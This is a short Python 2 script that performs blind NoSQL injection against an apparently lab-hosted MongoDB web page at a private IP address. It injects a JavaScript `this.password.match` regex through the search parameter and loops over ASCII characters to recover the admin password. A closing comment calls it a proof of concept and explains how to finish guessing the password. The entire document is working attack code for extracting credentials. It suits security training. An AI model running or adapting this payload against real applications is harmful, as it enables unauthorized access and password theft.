import cookielib, urllib2, urllib
from bs4 import BeautifulSoup
import urllib
c = "a"

link = "http://192.168.126.130/mongodb/example2/?search=admin%27%20%26%26%20this.password.match%28/"+str(c) + str("/)%00")
r = urllib.urlopen(link).read()
soup = BeautifulSoup(r,"lxml")
print type(soup)
string = soup.find_all("td")
string = str(string)
if len(string) > 5: 
	foundl = 1 
else :foundl = 0

l= []
cval = 1
x= 0
while cval != 128 : 	
	a="".join(chr(cval) for x in range(1)) #all chars possible
	print a
	c = a
	link = "http://192.168.126.130/mongodb/example2/?search=admin%27%20%26%26%20this.password.match%28/"+str(c) + str("/)%00")
	r = urllib.urlopen(link).read()
	soup = BeautifulSoup(r,"lxml")
	print type(soup)
	string = soup.find_all("td")
	string = str(string)
	#print string
	#print link
	if len(string) > 10: 
			l.append(c)
			x= x + 1
	cval = cval+1

print l

# proof of concept now you just need to put the chars together and guess the pass if you put $ at the end and it retreves the admin folder, you have guessed thepassword :-)

	







